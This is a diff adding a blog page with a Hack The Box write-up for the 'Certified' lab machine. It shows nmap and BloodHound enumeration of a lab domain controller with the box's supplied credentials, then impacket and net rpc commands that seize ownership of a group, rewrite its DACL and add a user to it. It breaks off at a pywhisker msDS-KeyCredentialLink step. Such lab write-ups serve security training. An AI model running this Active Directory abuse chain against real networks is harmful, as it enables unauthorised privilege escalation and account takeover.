@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/03/14/hackthebox-certified/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewCertified is a medium-difficulty machine from Hack The Box dealing initially with provided credentials that will allow us to enumerate the DC through BloodHound. We’ll then abuse judith’s Writ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Certified">
+<meta property="og:url" content="http://fouedsaidi.com/2025/03/14/Hackthebox-Certified/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewCertified is a medium-difficulty machine from Hack The Box dealing initially with provided credentials that will allow us to enumerate the DC through BloodHound. We’ll then abuse judith’s Writ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Certified/Certified.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Certified/blood.png">
+<meta property="article:published_time" content="2025-03-14T16:28:50.000Z">
+<meta property="article:modified_time" content="2025-03-14T17:54:39.842Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Certified/Certified.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Certified -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Certified</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-14 17:28:50</span>
+        <span class="mobile">2025-03-14 17:28:50</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-14 18:54:39</span>
+            <span class="mobile">2025-03-14 18:54:39</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Certified is a medium-difficulty machine from Hack The Box dealing initially with provided credentials that will allow us to enumerate the DC through BloodHound. We’ll then abuse judith’s WriteOwner over the MANAGEMENT group to make her owner and add herself to the group so she’ll be able to abuse msDS-KeyCredentialLink over svc_management user to request a certificate on his behalf and get user flag. Finally we’ll abuse svc_management’s GenericAll on ca_operator to change his upn to the administrator and request a certificate on his behalf to get a hold to his NTLM Hash.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Certified/Certified.png"
+                      alt="Certified-info-card"
+                ><figcaption>Certified-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─<span class="variable">$</span> nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">22.253</span></span><br><span class="line">Starting Nmap <span class="number">7.94</span>SVN ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-11-05</span> <span class="number">13</span>:<span class="number">32</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">22.253</span></span><br><span class="line">Host is up (<span class="number">0.12</span>s latency).</span><br><span class="line">Not shown: <span class="number">989</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp   open  domain        Simple DNS Plus</span><br><span class="line"><span class="number">88</span>/tcp   open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2024</span><span class="literal">-11-06</span> <span class="number">01</span>:<span class="number">37</span>:<span class="number">30</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.certified.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:DC01.certified.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-05-13T15</span>:<span class="number">49</span>:<span class="number">36</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-05-13T15</span>:<span class="number">49</span>:<span class="number">36</span></span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2024</span><span class="literal">-11-06T01</span>:<span class="number">38</span>:<span class="number">53</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">7</span>h04m53s from scanner time.</span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp  open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2024</span><span class="literal">-11-06T01</span>:<span class="number">38</span>:<span class="number">54</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">7</span>h04m52s from scanner time.</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.certified.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:DC01.certified.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-05-13T15</span>:<span class="number">49</span>:<span class="number">36</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-05-13T15</span>:<span class="number">49</span>:<span class="number">36</span></span><br><span class="line"><span class="number">3268</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.certified.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:DC01.certified.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-05-13T15</span>:<span class="number">49</span>:<span class="number">36</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-05-13T15</span>:<span class="number">49</span>:<span class="number">36</span></span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2024</span><span class="literal">-11-06T01</span>:<span class="number">38</span>:<span class="number">53</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">7</span>h04m53s from scanner time.</span><br><span class="line"><span class="number">3269</span>/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.certified.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:DC01.certified.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-05-13T15</span>:<span class="number">49</span>:<span class="number">36</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-05-13T15</span>:<span class="number">49</span>:<span class="number">36</span></span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2024</span><span class="literal">-11-06T01</span>:<span class="number">38</span>:<span class="number">54</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">7</span>h04m52s from scanner time.</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2<span class="literal">-time</span>: </span><br><span class="line">|   date: <span class="number">2024</span><span class="literal">-11-06T01</span>:<span class="number">38</span>:<span class="number">15</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: mean: <span class="number">7</span>h04m52s, deviation: <span class="number">0</span>s, median: <span class="number">7</span>h04m52s</span><br><span class="line">| smb2<span class="literal">-security-mode</span>: </span><br><span class="line">|   <span class="number">3</span>:<span class="number">1</span>:<span class="number">1</span>: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">104.95</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have out typical AD DC ports open.</p>
+<p>One more thing, is that credentials were supplied with the box: <code>Username: judith.mader Password: judith09</code></p>
+<h4 id="Bloodhound-Enumeration"><a href="#Bloodhound-Enumeration" class="headerlink" title="Bloodhound Enumeration"></a>Bloodhound Enumeration</h4><p>We can use the provided credentials alongside the bloodhound-python tool to gather intel on the machine:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified]</span><br><span class="line">└─$ bloodhound-python -d certified.htb -c all -u judith.mader -p <span class="string">&#x27;judith09&#x27;</span> -ns 10.129.22.253 --zip</span><br><span class="line">/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\-&#x27;</span></span><br><span class="line">  xml_sid_rex = re.compile(<span class="string">&#x27;&lt;UserId&gt;(S-[0-9\-]+)&lt;/UserId&gt;&#x27;</span>)</span><br><span class="line">INFO: Found AD domain: certified.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.certified.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.certified.htb</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 53 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC01.certified.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 16S</span><br><span class="line">INFO: Compressing output into 20250314235232_bloodhound.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can first set judith as an owned user, then we can see that she has <code>WriteOwner</code> on the <code>MANAGEMENT</code> group which has <code>GenericWrite</code> on <code>MANAGEMENT_SVC</code> user who can <code>PSRemote</code> to the DC. So what we’ll be doing now is first add ourselves as owner of MANAGEMENT group, then add ourselves as a member to later abuse the GenericWrite functionality.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Certified/blood.png"
+                      alt="BloodHound Enumeration"
+                ><figcaption>BloodHound Enumeration</figcaption></figure></p>
+<h3 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h3><h4 id="Adding-judith-as-Owner-to-MANAGEMENT-group"><a href="#Adding-judith-as-Owner-to-MANAGEMENT-group" class="headerlink" title="Adding judith as Owner to MANAGEMENT group"></a>Adding judith as Owner to MANAGEMENT group</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified]</span><br><span class="line">└─$ impacket-owneredit -action write -new-owner <span class="string">&#x27;judith.mader&#x27;</span> -target <span class="string">&#x27;management&#x27;</span> <span class="string">&#x27;certified/judith.mader&#x27;</span>:<span class="string">&#x27;judith09&#x27;</span> -dc-ip 10.129.22.253 </span><br><span class="line">&lt;snip&gt;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Current owner information below</span><br><span class="line">[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512</span><br><span class="line">[*] - sAMAccountName: Domain Admins</span><br><span class="line">[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb</span><br><span class="line">[*] OwnerSid modified successfully!</span><br><span class="line">                                                                                                                                                 </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Granting-judith-WriteMembers-permissions"><a href="#Granting-judith-WriteMembers-permissions" class="headerlink" title="Granting judith WriteMembers permissions"></a>Granting judith WriteMembers permissions</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified]</span><br><span class="line">└─$ impacket-dacledit -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;WriteMembers&#x27;</span> -principal <span class="string">&#x27;judith.mader&#x27;</span> -target-dn <span class="string">&#x27;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&#x27;</span> <span class="string">&#x27;certified.htb&#x27;</span>/<span class="string">&#x27;judith.mader&#x27;</span>:<span class="string">&#x27;judith09&#x27;</span></span><br><span class="line">&lt;snip&gt;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacledit-20250315-000215.bak</span><br><span class="line">[*] DACL modified successfully!</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Adding-judith-as-member-of-MANANEGEMENT"><a href="#Adding-judith-as-member-of-MANANEGEMENT" class="headerlink" title="Adding judith as member of MANANEGEMENT"></a>Adding judith as member of MANANEGEMENT</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified]</span><br><span class="line">└─$ net rpc group addmem <span class="string">&quot;Management&quot;</span> <span class="string">&quot;judith.mader&quot;</span> -U <span class="string">&quot;certified.htb&quot;</span>/<span class="string">&quot;judith.mader&quot;</span>%<span class="string">&quot;judith09&quot;</span> -S <span class="string">&quot;DC01.certified.htb&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Note: this will not return a message after success</p>
+<h4 id="msDS-KeyCredentialLink-abuse-for-svc-management"><a href="#msDS-KeyCredentialLink-abuse-for-svc-management" class="headerlink" title="msDS-KeyCredentialLink abuse for svc_management"></a>msDS-KeyCredentialLink abuse for svc_management</h4><p>We will use pywhisker tool from github to modify the msDS-KeyCredentialLink attribute of svc_management and eventually get his NTLM hash:</p>
